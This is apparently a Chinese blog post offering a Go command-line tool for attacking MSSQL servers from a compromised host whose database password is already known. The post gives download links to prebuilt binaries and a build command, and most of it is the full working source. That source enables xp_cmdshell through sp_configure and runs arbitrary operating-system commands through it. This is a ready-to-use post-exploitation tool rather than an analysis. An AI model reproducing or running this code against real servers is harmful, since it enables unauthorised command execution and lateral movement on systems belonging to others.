---
title: mssql linux 命令行工具
date: 2019-09-19 02:31:54
tags: golang
---

- 背景: 已知内网某台机器mssql密码，想利用，php连接mssql又缺少库、webshell无root权限、不能出网、无交互、基于web建立socks通道很容易断、python打包文件过大或缺少库...此工具正是解决该问题的
- 未解决问题：
1. 执行多行sql语句并打印
2. windows 认证
3. 后面按需要考虑增加 `CLR` `Agent Jobs` `SandBoxMode` `sp_OACreate` 等方式命令执行

- [Download-linux](https://github.com/mabangde/pentesttools/raw/master/linux/sqltool_amd64_upx.elf)
- [Download-win](https://github.com/mabangde/pentesttools/raw/master/windows/sqltool_amd64.exe)


#### 编译:
```bash
docker run  --rm -it -v ${PWD}:/go golang:stretch env  GO111MODULE=on GOPROXY=https://goproxy.io GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags -s -a -installsuffix cgo sqltool.go
upx -9 sqltool
```
![2019-09-19-03-08-47](https://wolvez.oss-cn-hangzhou.aliyuncs.com/c8bba1200ce20590b720433127454158.png)
![2019-09-19-12-13-04](https://wolvez.oss-cn-hangzhou.aliyuncs.com/f0067f53d9c3fca32c40249a678eacd2.png)

```go
package main

import (
  "os"
  "fmt"
  "log"
  //"reflect"
  "github.com/urfave/cli"
  "database/sql"
  _ "github.com/denisenkom/go-mssqldb"
)

var (

	server   string  = "127.0.0.1" 
	user = "sa"
	password string
	query string
	cmd string
	debug bool
	enable bool
	connString string
	conn *sql.DB
	err error

)


func main() {
	app := cli.NewApp()
	app.Name = "Mssql Toolkit"
	app.Version = "1.0"
	
	app.Usage = "mssql command tool"
	app.Authors = []cli.Author{
		cli.Author{
		  Name:  "lostwolf",
		  Email: "linuxseclab@gmail.com",
		},
	  }

	app.Flags = []cli.Flag {
		cli.StringFlag {
			Name: "server,host,s",
			Value: "127.0.0.1",
			Usage: "The database server",
		},
		cli.StringFlag {
			Name: "user, u",
			Value: "sa",
			Usage: "The database user",
		},
		cli.StringFlag {
			Name: "password, p",
			Usage: "The database password",
		},
		cli.StringFlag {
			Name: "query, sql,q",
			Value: "select @@version",
			Usage: "SQL query",
		},
	
		cli.StringFlag {
			Name: "exec,c,cmd",
			Value: "whoami",
			Usage: "Exec System Command",

		},
		cli.BoolFlag{
			Name: "debug,d",
			Usage: "Debug info",
		},
		cli.BoolFlag{
			Name: "enable,e",
			Usage: "Enabled xp_cmdshell",
		},
	}

	app.Action = func(c *cli.Context) error {
		if c.IsSet("server"){
			server=c.String("server")
		}
		if c.IsSet("user"){
			user=c.String("user")
		}
		if c.IsSet("password"){
			password=c.String("password")
		}
		if c.IsSet("query"){
			query=c.String("query")
		}
		if c.IsSet("cmd"){
			cmd=c.String("cmd")
		}
		
		
		connString = fmt.Sprintf("server=%s;user id=%s;password=%s;port=1433;encrypt=disable", server, user, password)
		conn,err = sql.Open("mssql", connString)
		defer conn.Close()
		//fmt.Println(reflect.TypeOf(conn))
		//fmt.Println(conn)
	
		if err != nil {
		log.Fatal("Open connection failed:", err.Error())
		}
		//fmt.Println(" Connect:",connString) 
		defer conn.Close()
    if c.IsSet("debug"){
		if c.Bool("debug"){
			log.Println("Debug info:")
			fmt.Printf(" server:%s\n", server)
			fmt.Printf(" user:%s\n", user)
			fmt.Printf(" password:%s\n", password)
			fmt.Printf(" Query:%s\n", query)
			fmt.Printf(" Cmd:%s\n", cmd)
			fmt.Println(" Connect:",connString)
			}
		}
		if c.IsSet("enable"){
			if c.Bool("enable"){
				Open()
			}
		}
	
		if c.IsSet("query"){		
				exec_sql()
		}
		if c.IsSet("cmd"){		
			os_shell()
		}
		
    return nil
	}

	if len(os.Args) <=1 {
	fmt.Printf("Try '%s  --help' for more options.\n",os.Args[0])
	}
	
	err :=app.Run(os.Args)
	if err !=nil {
		log.Fatal(err)
		
	}
  }

  func exec_sql(){
	rows, err := conn.Query(query)
	if err != nil {
		
		panic(err.Error()) 
		
	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err !=nil{
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}
	
	for rows.Next(){
		err=rows.Scan(scanArgs...)
		if err !=nil{
			panic(err.Error())
		}
		var value string
		for _,col := range values{
			if col ==nil{
				value=""
			}else{
				value=string(col)
			}
			fmt.Println(value)

		}
		//fmt.Println("-----------------------------------")

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}

  func Open() {
	value, err :=conn.Prepare("select value_in_use from   sys.configurations where  name = 'xp_cmdshell'")
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer value.Close()

	row := value.QueryRow()
	//var somenumber int64
	var v int
	err = row.Scan( &v)
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}
	if v==1 {
		fmt.Printf("xp_cmdshell Enabled\n")
		 
	}else{
		fmt.Printf("Open xp_cmdshell...\n")
	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
	if err != nil {
		//fmt.Println("Query Error", err)
		return
	}
	
	defer stmt.Close()
	stmt.Query()
	

	}
	return
	
}


func os_shell(){
	rows, err := conn.Query(`exec master..xp_cmdshell '` + cmd + `' `)
	if err != nil {
		
		panic(err.Error()) 
		
	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err !=nil{
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}
	
	for rows.Next(){
		err=rows.Scan(scanArgs...)
		if err !=nil{
			panic(err.Error())
		}
		var value string
		for _,col := range values{
			if col ==nil{
				value=""
			}else{
				value=string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}
```
